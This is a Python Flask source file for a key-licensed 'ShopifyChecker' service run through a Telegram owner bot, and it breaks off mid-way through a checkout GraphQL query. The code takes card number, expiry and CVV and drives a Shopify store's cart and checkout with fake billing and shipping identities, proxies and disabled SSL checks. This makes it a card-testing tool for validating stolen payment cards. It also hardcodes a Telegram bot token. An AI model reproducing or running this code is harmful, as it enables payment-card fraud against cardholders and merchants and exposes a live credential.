import aiohttp
import asyncio
import re
import os
import random
import string
import secrets
import sqlite3
import threading
import time
import datetime
from urllib.parse import urlparse
from typing import Optional, Tuple
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", secrets.token_hex(32))

# ---------- Key store ----------
_keys_lock = threading.Lock()
VALID_KEYS = {}  # key -> {'expiry': datetime, 'name': str}

# ---------- DB persistence (PostgreSQL if DATABASE_URL set, else SQLite) ----------
DATABASE_URL = os.environ.get("DATABASE_URL", "")
_USE_PG = bool(DATABASE_URL)

# SQLite fallback path
DB_PATH = os.path.join(os.path.dirname(__file__), "keys.db")


def _pg_conn():
    """Open a fresh psycopg2 connection (PostgreSQL mode only)."""
    import psycopg2
    url = DATABASE_URL
    # Render Postgres URLs start with "postgres://" but psycopg2 wants "postgresql://"
    if url.startswith("postgres://"):
        url = "postgresql://" + url[len("postgres://"):]
    return psycopg2.connect(url)


def _db_init():
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute("""CREATE TABLE IF NOT EXISTS keys (
                    key    TEXT PRIMARY KEY,
                    expiry TEXT NOT NULL,
                    name   TEXT NOT NULL DEFAULT ''
                )""")
            con.commit()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            con.execute("""CREATE TABLE IF NOT EXISTS keys (
                key      TEXT PRIMARY KEY,
                expiry   TEXT NOT NULL,
                name     TEXT NOT NULL DEFAULT ''
            )""")
            con.commit()


def _db_save_key(key: str, expiry: datetime.datetime, name: str):
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute(
                    "INSERT INTO keys (key, expiry, name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (key) DO UPDATE SET expiry=EXCLUDED.expiry, name=EXCLUDED.name",
                    (key, expiry.isoformat(), name),
                )
            con.commit()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            con.execute(
                "INSERT OR REPLACE INTO keys (key, expiry, name) VALUES (?, ?, ?)",
                (key, expiry.isoformat(), name),
            )
            con.commit()


def _db_delete_key(key: str):
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute("DELETE FROM keys WHERE key = %s", (key,))
            con.commit()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            con.execute("DELETE FROM keys WHERE key = ?", (key,))
            con.commit()


def _db_purge_expired():
    now_iso = datetime.datetime.utcnow().isoformat()
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute("DELETE FROM keys WHERE expiry <= %s", (now_iso,))
            con.commit()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            con.execute("DELETE FROM keys WHERE expiry <= ?", (now_iso,))
            con.commit()


def _db_load_keys():
    """Load all non-expired keys from DB into VALID_KEYS."""
    _db_purge_expired()
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute("SELECT key, expiry, name FROM keys")
                rows = cur.fetchall()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            rows = con.execute("SELECT key, expiry, name FROM keys").fetchall()

    with _keys_lock:
        for key, expiry_iso, name in rows:
            try:
                expiry = datetime.datetime.fromisoformat(expiry_iso)
                VALID_KEYS[key] = {"expiry": expiry, "name": name}
            except ValueError:
                pass


def _db_lookup_key(key: str):
    """Check a single key directly in the DB (bypasses in-memory cache)."""
    now_iso = datetime.datetime.utcnow().isoformat()
    if _USE_PG:
        con = _pg_conn()
        try:
            with con.cursor() as cur:
                cur.execute(
                    "SELECT expiry, name FROM keys WHERE key = %s AND expiry > %s",
                    (key, now_iso),
                )
                row = cur.fetchone()
        finally:
            con.close()
    else:
        with sqlite3.connect(DB_PATH) as con:
            row = con.execute(
                "SELECT expiry, name FROM keys WHERE key = ? AND expiry > ?",
                (key, now_iso),
            ).fetchone()

    if not row:
        return None
    try:
        return {"expiry": datetime.datetime.fromisoformat(row[0]), "name": row[1]}
    except ValueError:
        return None


_db_init()
_db_load_keys()


def generate_key():
    chars = string.ascii_uppercase + string.digits
    parts = ["".join(random.choices(chars, k=4)) for _ in range(3)]
    return "RYU-" + "-".join(parts)


def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            if request.is_json or request.headers.get("X-Requested-With"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect("/login")
        return f(*args, **kwargs)

    return decorated


# ---------- Owner Telegram bot (background thread) ----------
OWNER_BOT_TOKEN = os.environ.get("OWNER_BOT_TOKEN", "8326280463:AAFhT6F4m5gFaKReNtLVk5DqssVKyYLjrxg")
OWNER_CHAT_ID = str(os.environ.get("OWNER_CHAT_ID", "7604528850"))


def _bot_polling():
    if not OWNER_BOT_TOKEN or not OWNER_CHAT_ID:
        return
    import urllib.request, urllib.parse, json as _json

    offset = 0
    base = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}"

    def _get(path, **params):
        url = f"{base}/{path}?" + urllib.parse.urlencode(params)
        try:
            with urllib.request.urlopen(url, timeout=35) as r:
                return _json.loads(r.read())
        except Exception:
            return {}

    def _post(path, payload):
        data = urllib.parse.urlencode(payload).encode()
        try:
            req = urllib.request.Request(f"{base}/{path}", data=data)
            with urllib.request.urlopen(req, timeout=10) as r:
                return _json.loads(r.read())
        except Exception:
            return {}

    while True:
        try:
            upd = _get(
                "getUpdates", offset=offset, timeout=30, allowed_updates='["message"]'
            )
            for u in upd.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                chat_id = str(msg.get("chat", {}).get("id", ""))
                text = (msg.get("text") or "").strip()

                if chat_id != OWNER_CHAT_ID:
                    continue

                if text.startswith("/keygen"):
                    parts = text.split(None, 3)
                    if len(parts) < 4:
                        _post(
                            "sendMessage",
                            {
                                "chat_id": chat_id,
                                "text": "Usage: /keygen <days> <amount> <name>\nExample: /keygen 30 5 JohnDoe",
                            },
                        )
                        continue
                    try:
                        days = max(1, int(parts[1]))
                        amount = max(1, min(int(parts[2]), 50))
                        name = parts[3].strip()[:32] or "User"
                    except ValueError:
                        _post(
                            "sendMessage",
                            {
                                "chat_id": chat_id,
                                "text": "Days and amount must be integers.",
                            },
                        )
                        continue

                    expiry = datetime.datetime.utcnow() + datetime.timedelta(days=days)
                    new_keys = []
                    with _keys_lock:
                        for _ in range(amount):
                            k = generate_key()
                            VALID_KEYS[k] = {"expiry": expiry, "name": name}
                            new_keys.append(k)
                    for k in new_keys:
                        _db_save_key(k, expiry, name)

                    lines = "\n".join(new_keys)
                    _post(
                        "sendMessage",
                        {
                            "chat_id": chat_id,
                            "text": (
                                f"✅ Generated {amount} key(s) for <b>{name}</b> — valid for {days} day(s):\n\n"
                                f"<pre>{lines}</pre>\n\n"
                                f"Expires: {expiry.strftime('%Y-%m-%d %H:%M')} UTC"
                            ),
                            "parse_mode": "HTML",
                        },
                    )

                elif text.startswith("/listkeys"):
                    now = datetime.datetime.utcnow()
                    with _keys_lock:
                        active = {
                            k: v for k, v in VALID_KEYS.items() if v["expiry"] > now
                        }
                    if not active:
                        _post(
                            "sendMessage",
                            {"chat_id": chat_id, "text": "No active keys."},
                        )
                    else:
                        lines = "\n".join(
                            f"{k}  [{v.get('name', '?')}]  exp {v['expiry'].strftime('%Y-%m-%d')}"
                            for k, v in active.items()
                        )
                        _post(
                            "sendMessage",
                            {
                                "chat_id": chat_id,
                                "text": f"<pre>{lines}</pre>",
                                "parse_mode": "HTML",
                            },
                        )

                elif text.startswith("/revokekey"):
                    parts = text.split()
                    if len(parts) < 2:
                        _post(
                            "sendMessage",
                            {"chat_id": chat_id, "text": "Usage: /revokekey <KEY>"},
                        )
                        continue
                    k = parts[1].upper()
                    with _keys_lock:
                        removed = VALID_KEYS.pop(k, None)
                    if removed:
                        _db_delete_key(k)
                        _post(
                            "sendMessage",
                            {
                                "chat_id": chat_id,
                                "text": f"✅ Key {k} [{removed.get('name', '')}] revoked.",
                            },
                        )
                    else:
                        _post(
                            "sendMessage",
                            {"chat_id": chat_id, "text": f"Key {k} not found."},
                        )

                elif text.startswith("/help"):
                    _post(
                        "sendMessage",
                        {
                            "chat_id": chat_id,
                            "text": (
                                "Owner commands:\n"
                                "/keygen &lt;days&gt; &lt;amount&gt; &lt;name&gt; — generate keys\n"
                                "/listkeys — list active keys with names\n"
                                "/revokekey &lt;KEY&gt; — revoke a key\n"
                                "/help — this message"
                            ),
                            "parse_mode": "HTML",
                        },
                    )
        except Exception:
            time.sleep(5)


class ShopifyChecker:
    def __init__(self):
        self.session = None
        self.proxy = None

    def extract_between(self, text: str, start: str, end: str) -> Optional[str]:
        try:
            start_idx = text.index(start) + len(start)
            end_idx = text.index(end, start_idx)
            return text[start_idx:end_idx]
        except ValueError:
            return None

    def find_between(self, s, first, last):
        try:
            start = s.index(first) + len(first)
            end = s.index(last, start)
            return s[start:end]
        except ValueError:
            return ""

    def generate_random_name(self) -> Tuple[str, str]:
        first_names = [
            "John",
            "James",
            "Robert",
            "Michael",
            "William",
            "David",
            "Richard",
            "Joseph",
        ]
        last_names = [
            "Smith",
            "Johnson",
            "Williams",
            "Brown",
            "Jones",
            "Garcia",
            "Miller",
            "Davis",
        ]
        return random.choice(first_names), random.choice(last_names)

    def generate_email(self, first_name: str, last_name: str) -> str:
        random_num = "".join(random.choices(string.digits, k=4))
        return f"{first_name.lower()}.{last_name.lower()}{random_num}@gmail.com"

    def generate_billing_address(self) -> dict:
        return {
            "firstName": "Ella",
            "lastName": "Anderson",
            "street": "42 Canal Street",
            "city": "New Orleans",
            "state": "LA",
            "zip": "70130",
            "phone": "5045550124",
            "country": "US",
        }

    def generate_address(self) -> dict:
        return self.generate_billing_address()

    def generate_random_shipping_address(self) -> dict:
        import random as _rand

        pool = [
            {
                "firstName": "James",
                "lastName": "Wilson",
                "street": "781 N Clark Street",
                "city": "Chicago",
                "state": "IL",
                "zip": "60610",
                "phone": "3125550181",
                "country": "US",
            },
            {
                "firstName": "Maria",
                "lastName": "Garcia",
                "street": "2201 Broadway",
                "city": "New York",
                "state": "NY",
                "zip": "10024",
                "phone": "2125550293",
                "country": "US",
            },
            {
                "firstName": "Robert",
                "lastName": "Martinez",
                "street": "4520 Hollywood Blvd",
                "city": "Los Angeles",
                "state": "CA",
                "zip": "90027",
                "phone": "3235550472",
                "country": "US",
            },
            {
                "firstName": "Linda",
                "lastName": "Thompson",
                "street": "315 E 8th Street",
                "city": "Austin",
                "state": "TX",
                "zip": "78701",
                "phone": "5125550138",
                "country": "US",
            },
            {
                "firstName": "Michael",
                "lastName": "Davis",
                "street": "920 SW 6th Avenue",
                "city": "Portland",
                "state": "OR",
                "zip": "97204",
                "phone": "5035550294",
                "country": "US",
            },
            {
                "firstName": "Patricia",
                "lastName": "Brown",
                "street": "1540 Market Street",
                "city": "San Francisco",
                "state": "CA",
                "zip": "94102",
                "phone": "4155550361",
                "country": "US",
            },
            {
                "firstName": "William",
                "lastName": "Johnson",
                "street": "248 NW 5th Ave",
                "city": "Miami",
                "state": "FL",
                "zip": "33128",
                "phone": "3055550182",
                "country": "US",
            },
            {
                "firstName": "Barbara",
                "lastName": "Lee",
                "street": "701 N 9th Street",
                "city": "Phoenix",
                "state": "AZ",
                "zip": "85006",
                "phone": "6025550247",
                "country": "US",
            },
        ]
        return _rand.choice(pool)

    async def fetch_products(self, domain: str) -> Tuple[bool, any]:
        candidate_urls = [
            f"https://{domain}/products.json",
            f"https://{domain}/collections/all/products.json",
        ]
        try:
            products = []
            for url in candidate_urls:
                try:
                    async with self.session.get(
                        url, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        if resp.status != 200:
                            continue
                        data = await resp.json(content_type=None)
                        products = data.get("products", [])
                        if products:
                            break
                except Exception:
                    continue

            if not products:
                return False, "Site Error - Cannot access products"

            min_price = float("inf")
            min_product = None

            for product in products:
                if not product.get("variants"):
                    continue
                for variant in product["variants"]:
                    if not variant.get("available", False):
                        continue
                    try:
                        price = variant.get("price", "0")
                        if isinstance(price, str):
                            price = float(price.replace(",", ""))
                        else:
                            price = float(price)
                        if price < min_price and price > 0:
                            min_price = price
                            min_product = {
                                "price": f"{price:.2f}",
                                "variant_id": str(variant["id"]),
                                "handle": product["handle"],
                            }
                    except (ValueError, TypeError, KeyError):
                        continue

            if min_product:
                return True, min_product
            else:
                return False, "No valid products found"

        except aiohttp.ClientError:
            return False, "Connection error - Check proxy"
        except Exception as e:
            return False, f"Error: {str(e)}"

    async def fetch_all_products(self, domain: str) -> Tuple[bool, any]:
        candidate_urls = [
            f"https://{domain}/products.json?limit=250",
            f"https://{domain}/collections/all/products.json?limit=250",
            f"https://{domain}/collections/frontpage/products.json?limit=250",
        ]
        last_status = None
        for url in candidate_urls:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15)
                ) as resp:
                    last_status = resp.status
                    if resp.status != 200:
                        continue

                    data = await resp.json(content_type=None)
                    products = data.get("products", [])
                    if not products:
                        continue

                    result = []
                    for product in products:
                        for variant in product.get("variants", []):
                            try:
                                price = variant.get("price", "0")
                                if isinstance(price, str):
                                    price = float(price.replace(",", ""))
                                else:
                                    price = float(price)
                                if price > 0:
                                    result.append(
                                        {
                                            "title": f"{product['title']} - {variant.get('title', '')}".strip(
                                                " - "
                                            ),
                                            "price": f"{price:.2f}",
                                            "variant_id": str(variant["id"]),
                                            "handle": product["handle"],
                                            "available": variant.get(
                                                "available", False
                                            ),
                                        }
                                    )
                            except (ValueError, TypeError, KeyError):
                                continue

                    if result:
                        return True, result
            except aiohttp.ClientError:
                continue
            except Exception:
                continue

        status_hint = f" (HTTP {last_status})" if last_status else ""
        return (
            False,
            f"Cannot access products{status_hint} - site may block automated requests",
        )

    async def check_card(
        self,
        domain: str,
        cc: str,
        mes: str,
        ano: str,
        cvv: str,
        proxy: Optional[str] = None,
        custom_address: Optional[dict] = None,
        selected_variant: Optional[str] = None,
        ship_name: Optional[str] = None,
    ) -> Tuple[bool, str, dict]:
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            self.session = aiohttp.ClientSession(
                connector=connector, timeout=aiohttp.ClientTimeout(total=30)
            )

            domain = domain.replace("https://", "").replace("http://", "").strip("/")
            base_url = f"https://{domain}"

            if selected_variant:
                success = True
                product_data = {
                    "variant_id": selected_variant.split("|")[0],
                    "handle": selected_variant.split("|")[1]
                    if "|" in selected_variant
                    else "product",
                    "price": selected_variant.split("|")[2]
                    if len(selected_variant.split("|")) > 2
                    else "1.00",
                }
            else:
                success, product_data = await self.fetch_products(domain)

            if not success:
                return False, product_data, {}

            variant_id = product_data["variant_id"]
            product_handle = product_data["handle"]

            # Billing: always Ella Anderson
            bill = self.generate_billing_address()
            b_first = bill["firstName"]
            b_last = bill["lastName"]
            b_street = bill["street"]
            b_city = bill["city"]
            b_state = bill["state"]
            b_zip = bill["zip"]
            b_phone = bill["phone"]
            b_country = bill["country"]

            # Shipping: custom (from user) or random
            if custom_address and custom_address.get("street"):
                s_name = (custom_address.get("name") or "").strip()
                if ship_name and ship_name.strip():
                    s_name = ship_name.strip()
                if s_name:
                    parts = s_name.split(None, 1)
                    firstName = parts[0]
                    lastName = parts[1] if len(parts) > 1 else parts[0]
                else:
                    firstName, lastName = self.generate_random_name()
                street = custom_address.get("street", "")
                city = custom_address.get("city", "")
                state = custom_address.get("state", "")
                s_zip = custom_address.get("zip", "")
                phone = (
                    re.sub(r"\D", "", custom_address.get("phone", "")) or "5555550000"
                )
                country_code = custom_address.get("country", "US") or "US"
            else:
                rand_addr = self.generate_random_shipping_address()
                firstName = rand_addr["firstName"]
                lastName = rand_addr["lastName"]
                street = rand_addr["street"]
                city = rand_addr["city"]
                state = rand_addr["state"]
                s_zip = rand_addr["zip"]
                phone = rand_addr["phone"]
                country_code = rand_addr.get("country", "US")

            email = self.generate_email(firstName, lastName)
            address2 = ""
            merch = variant_id

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "*/*",
                "Content-Type": "application/json",
            }

            cart_url = f"{base_url}/cart/add.js"
            await self.session.post(cart_url, json={"id": variant_id}, headers=headers)

            checkout_url = f"{base_url}/checkout/"
            resp = await self.session.post(checkout_url, headers=headers)
            checkout_url = str(resp.url)

            attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (
                attempt_token_match.group(1)
                if attempt_token_match
                else checkout_url.split("/")[-1].split("?")[0]
            )

            if "login" in checkout_url.lower():
                return False, "Site requires login", {}

            resp = await self.session.get(checkout_url, headers=headers)
            text = await resp.text()
            final_url = str(resp.url)

            def _extract_sst(html):
                patterns = [
                    ('name="serialized-sessionToken" content="&quot;', "&q"),
                    ('name="serialized-session-token" content="&quot;', "&q"),
                    ('"sessionToken":"', '"'),
                    ("'sessionToken':'", "'"),
                    ('"serializedSessionToken":"', '"'),
                    ("serializedSessionToken&quot;:&quot;", "&q"),
                    ("sessionToken&quot;:&quot;", "&q"),
                    ('"token":"', '"'),
                ]
                for start, end in patterns:
                    val = self.extract_between(html, start, end)
                    if val and len(val) > 10:
                        return val
                return None

            sst = _extract_sst(text)
            if not sst:
                await asyncio.sleep(2)
                resp = await self.session.get(checkout_url, headers=headers)
                text = await resp.text()
                final_url = str(resp.url)
                sst = _extract_sst(text)

            if not sst:
                snippet = text[:400].replace("\n", " ") if text else "empty"
                return False, f"No session token | url={final_url} | page={snippet}", {}

            queueToken = (
                self.extract_between(text, "queueToken&quot;:&quot;", "&q")
                or self.extract_between(text, '"queueToken":"', '"')
                or self.extract_between(text, "queueToken':'", "'")
                or None
            )
            stableId = (
                self.extract_between(text, "stableId&quot;:&quot;", "&q")
                or self.extract_between(text, '"stableId":"', '"')
                or self.extract_between(text, "stableId':'", "'")
                or None
            )
            subtotal = (
                self.extract_between(
                    text,
                    "totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;",
                    "&q",
                )
                or self.extract_between(text, '"totalAmount":{"value":{"amount":"', '"')
                or None
            )

            pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
            currency_match = re.search(pattern, text.lower())
            currency = currency_match.group(1).upper() if currency_match else "USD"

            graphql_url = (
                f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
            )

            shipping_json = {
                "query": "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment 